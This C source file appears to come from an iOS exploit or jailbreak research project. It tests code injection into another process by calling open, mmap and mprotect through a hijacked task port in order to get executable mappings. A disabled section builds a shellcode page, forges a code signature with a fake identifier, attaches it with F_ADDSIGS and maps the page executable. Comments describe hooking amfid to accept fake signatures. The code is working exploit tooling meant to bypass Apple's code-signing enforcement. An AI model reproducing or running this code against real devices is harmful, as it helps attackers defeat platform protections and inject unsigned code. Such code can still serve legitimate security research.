#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "debugger_support.h"

#include "cdhash.h"

#include "remote_call.h"

#include <CoreFoundation/CoreFoundation.h>

char* bundle_path() {
  CFBundleRef mainBundle = CFBundleGetMainBundle();
  CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
  int len = 4096;
  char* path = malloc(len);
  
  CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
  
  return path;
}

typedef struct user_fsignatures {
  off_t fs_file_start;	     /* offset of Mach-O image in FAT file */
  user_addr_t	fs_blob_start; /* F_ADDSIGS: mem address of signature */
  user_size_t	fs_blob_size;  /* size of signature blob */
} user_fsignatures_t;

// we can use F_ADDSIGS but the kernel will still callout to amfid for validation
// and amfid will only see the path to the file we're trying to add the sigs for
// so its probably easier to wrap the hashes and code in a fake dylib
// which the amfid hook can parse normally

void
test_injection(mach_port_t task_port, mach_port_t installd_task_port)
{
  
  // can we open and map as executable an executable from another bundle?

  
  // can amfid mmap as executable our binary?
  char* bundle = bundle_path();
  char* binary_path = NULL;
  asprintf(&binary_path, "%s/nsxpc2pc", bundle);
  printf("path: %s\n", binary_path);
  int remote_fd = (int)call_remote(task_port, open, 3,
                              REMOTE_CSTRING(binary_path),
                              REMOTE_LITERAL(O_RDONLY),
                              REMOTE_LITERAL(0));
  // we could also just push the fd - maybe the remote process can't open it but can mmap?
  if (remote_fd < 0) {
    printf("remote open failed\n");
  }
  
  uint64_t remote_mapping = (uint64_t)call_remote(task_port, mmap, 6,
                                                  REMOTE_LITERAL(0),
                                                  REMOTE_LITERAL(0x1000),
                                                  REMOTE_LITERAL(PROT_READ/*|PROT_EXEC*/),
                                                  REMOTE_LITERAL(MAP_FILE|MAP_PRIVATE),
                                                  REMOTE_LITERAL(remote_fd),
                                                  REMOTE_LITERAL(0));

  // should we add the sigs first?
  
  if (remote_mapping == MAP_FAILED) {
    printf("remote mmap failed\n");
  } else {
    printf("remote mmap success! 0x%llx\n", remote_mapping);
  }
  
  // can we make it executable?
  int ret = (int) call_remote(task_port, mprotect, 3,
                              REMOTE_LITERAL(remote_mapping),
                              REMOTE_LITERAL(0x1000),
                              REMOTE_LITERAL(PROT_READ|PROT_EXEC));
  
  if (ret != 0) {
    printf("remote mprotect failed %x\n", ret);
  }
  
#if 0
  
  // inject a page with simple shellcode then call it
  
  char* code_page = malloc(0x1000);
  memset(code_page, 0, 0x1000);
  
  char* mov_x0_0x1234 = "\x80\x46\x82\xd2";
  memcpy(code_page, mov_x0_0x1234, 4);
  

  // write that out to a file:
  FILE* f = tmpfile();
  size_t written = fwrite(code_page, 0x1000, 1, f);
  if (written != 1) {
    printf("write failed (%zx)\n", written);
    return;
  }
  
  int fd = fileno(f);

  
  // add a code signature:
  uint32_t blob_size = 0;
  void* cs_blob = fakesign(code_page, 0x1000, "fake.identifier", 0, "not.a.team.id", &blob_size);
  if (cs_blob == NULL) {
    printf("failed to get cd_blob\n");
    return;
  }
  
  // can amfid give us an fd to
  
  
  printf("got cs_blob: %p, size: %x", cs_blob, blob_size);
  
  user_fsignatures_t sigs = {0};
  sigs.fs_file_start = 0;
  sigs.fs_blob_start = (user_addr_t)cs_blob;
  sigs.fs_blob_size = blob_size;
  
  int err = fcntl(fd, F_ADDSIGS, &sigs);
  printf("F_ADDSIGS returned %x\n", err);
  
  // mmap that in as rx:
  void* mmaped = mmap(NULL, 0x1000, PROT_READ|PROT_EXEC, MAP_FILE|MAP_PRIVATE, fd, 0);
  if (mmaped == MAP_FAILED) {
    perror("mmap failed");
    return;
  }
  printf("mmap success: %p\n", mmaped);
#endif

}
